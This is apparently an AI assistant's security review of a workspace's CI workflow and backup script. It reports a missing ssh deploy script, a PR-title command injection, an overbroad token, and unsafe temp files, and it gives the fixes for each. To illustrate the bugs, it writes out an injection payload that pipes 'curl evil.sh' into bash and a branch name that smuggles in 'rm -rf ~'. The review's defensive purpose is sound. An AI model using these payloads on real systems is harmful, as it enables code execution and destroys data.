I couldn't find the deploy script you described. Nothing in this workspace uses `ssh` or puts a branch name into a command. These are the only related files:

- `.github/workflows/deploy.yml`: one `run:` step that echoes the PR title. No ssh, no branch name.
- `scripts/backup.sh`: a backup script that uses `scp`, not a deploy.
- `k8s/deployment.yml`: a Kubernetes manifest.

The script might be on another branch or not committed yet. Can you push it or give me the path? Until I've read it, I can't say whether it's safe to give to CI.

## The workflow you'd be giving CI has its own injection bug

`.github/workflows/deploy.yml` has the same kind of problem you're worried about:

1. **Command injection from the PR title (critical), `deploy.yml:14`.** `${{ github.event.pull_request.title }}` is pasted into the shell script before bash runs it. A PR titled `"; curl evil.sh | bash; echo "` would run on the runner. Pass the title through an environment variable instead:
   ```yaml
   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: printf 'Title is %s\n' "$PR_TITLE"
   ```
2. **`permissions: write-all` on `pull_request` (high), `deploy.yml:7`.** If that step is exploited, the attacker gets a token with every write permission. Use `contents: read` and add only what the job actually needs.
3. **A deploy job that runs on every PR.** Deploys normally run on `push` to `main` or on a protected environment, not on untrusted PR code.

## For the ssh script, once I can see it

Branch names are attacker-controlled: anyone who can push a branch picks the name. `ssh host "cd app && git checkout $branch"` has the remote shell parse the name again, so a branch like `x;rm${IFS}-rf${IFS}~` runs on the server. The fix is:
- Check the name against an allowlist before using it, for example `[[ $branch =~ ^[A-Za-z0-9._/-]+$ && $branch != -* ]] || exit 2`. Reject names that don't match rather than trying to clean them up.
- Don't make it part of the remote command text. Either pass it as data the remote side reads (`printf '%s\n' "$branch" | ssh host 'read -r b; git checkout -- "$b"'`), or quote it with `printf '%q'` after the check.
- Better still, use a fixed command on the server (`command=` in `authorized_keys`) that takes the branch from `SSH_ORIGINAL_COMMAND` and validates it there.

## `scripts/backup.sh` also needs work before it runs unattended

- It has no `set -Eeuo pipefail`, so if `tar` fails, `scp` still uploads a partial or missing archive.
- `/tmp/backup.$$` is a predictable path, which opens it to symlink and pre-creation attacks. Use `mktemp -d` and remove the directory from a `trap … EXIT` set up before the `mktemp` call.
- Expansions aren't quoted, and the date uses backticks.
- Cleanup only happens on success, so a failed run leaves the archive behind in `/tmp`.

I haven't edited or run anything. I can fix the workflow and `backup.sh`, or review the ssh script once you send it.

One more thing: the example script in the `bash-secure-scripting` skill looks broken. It has `local service="the"` and `local workdir="deploy"` where it should read the function's arguments, `"$1"` and `"$2"`. If someone copies it, those lines will be wrong.
